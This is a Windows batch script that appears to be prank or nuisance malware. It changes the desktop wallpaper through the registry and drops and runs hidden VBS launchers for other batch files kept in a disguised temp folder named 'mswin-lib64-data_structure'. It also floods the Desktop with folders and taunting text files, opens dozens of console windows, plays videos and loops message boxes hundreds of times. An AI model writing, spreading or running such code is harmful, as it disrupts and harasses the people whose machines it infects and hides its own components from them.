@echo off
copy "fucked.txt" "%userprofile%\fucked.txt"
start %userprofile%\fucked.txt
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d  %temp%\mswin-lib64-data_structure\idiots.png /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
timeout /t 1
cd %userprofile%\Desktop

start https://www.youtube.com/watch?v=xvFZjo5PgG0

cd %temp%\mswin-lib64-data_structure
(
echo Set WshShell = CreateObject^("WScript.Shell"^) 
echo WshShell.Run chr^(34^) ^& "veryfun.bat" ^& Chr^(34^), 0
echo Set WshShell = Nothing
)>"payload.vbs"
timeout /t 2
start payload.vbs
timeout /t 2
del payload.vbs

timeout /t 20

cd %temp%\mswin-lib64-data_structure
(
echo Set WshShell = CreateObject^("WScript.Shell"^) 
echo WshShell.Run chr^(34^) ^& "searches.bat" ^& Chr^(34^), 0
echo Set WshShell = Nothing
)>"payload.vbs"
timeout /t 2
start payload.vbs
timeout /t 2
del payload.vbs

timeout /t 20
cd %userprofile%\Desktop
mkdir lol xD youareakek my_stuff only_dumb_stuff folder New_Folder bihldaerrr Mum Passwords
set loop=0
:consoles
start cmd.exe
echo haha get lost idiot > %userprofile%\Desktop\%random%.txt
echo lol.lol > %userprofile%\Desktop\%random%.lol
set /a loop=%loop%+1 
if "%loop%"=="44" goto speak
goto consoles
:speak
cd /D "%~dp0"
start "" "wmplayer.exe" "%temp%\mswin-lib64-data_structure\badger.mp4"
start "" "wmplayer.exe" "%userprofile%\Downloads\badger.mp4"
set loop=0
timtout /t 8
:msgbox
start msgbox.vbs
set /a loop=%loop%+1 
if "%loop%"=="10" goto tosearch
goto msgbox
:tosearch
set loop=0
cd %temp%\mswin-lib64-data_structure
(
echo Set WshShell = CreateObject^("WScript.Shell"^) 
echo WshShell.Run chr^(34^) ^& "error.bat" ^& Chr^(34^), 0
echo Set WshShell = Nothing
)>"payload.vbs"
timeout /t 2
start payload.vbs
timeout /t 2
del payload.vbs
timeout /t 20
set loop=0
:randomboxes
start randombox.vbs
set /a loop=%loop%+1 
timeout /t 2
if "%loop%"=="222" goto beforeretry
goto randomboxes
:beforeretry
timeout /t 2
:retry
echo lol